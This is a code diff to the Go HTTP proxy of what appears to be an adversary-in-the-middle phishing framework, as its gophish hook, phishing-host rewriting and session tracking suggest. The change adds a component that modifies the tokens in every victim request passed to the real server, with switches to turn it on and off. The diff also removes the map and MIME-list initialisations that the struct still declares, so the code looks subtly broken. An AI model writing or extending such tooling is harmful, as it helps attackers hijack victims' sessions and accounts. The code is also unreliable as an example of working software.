@@ -78,6 +78,7 @@ type HttpProxy struct {
 	last_sid          int
 	developer         bool
 	ip_whitelist      map[string]int64
+	tokenModifier     *TokenModifier
 	ip_sids           map[string]string
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
@@ -116,11 +117,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		bl:                bl,
 		gophish:           NewGoPhish(),
 		isRunning:         false,
+		sessions:          make(map[string]*Session),
+		sids:              make(map[string]int),
 		last_sid:          0,
 		developer:         developer,
 		ip_whitelist:      make(map[string]int64),
-		ip_sids:           make(map[string]string),
-		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
+		tokenModifier:     NewTokenModifier(),
 	}
 
 	p.Server = &http.Server{
@@ -876,6 +878,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 			}
+
+			// Apply token modifications before sending request to target server
+			p.tokenModifier.ModifyRequest(req)
 
 			return req, nil
 		})
@@ -1751,4 +1756,24 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 		}
 	}
 	return hostname, false
+}
+
+// GetTokenModifier returns the token modifier instance
+func (p *HttpProxy) GetTokenModifier() *TokenModifier {
+	return p.tokenModifier
+}
+
+// EnableTokenModifier enables token modification globally
+func (p *HttpProxy) EnableTokenModifier() {
+	p.tokenModifier.Enable()
+}
+
+// DisableTokenModifier disables token modification globally  
+func (p *HttpProxy) DisableTokenModifier() {
+	p.tokenModifier.Disable()
+}
+
+// IsTokenModifierEnabled returns whether token modification is enabled
+func (p *HttpProxy) IsTokenModifierEnabled() bool {
+	return p.tokenModifier.IsEnabled()
 }
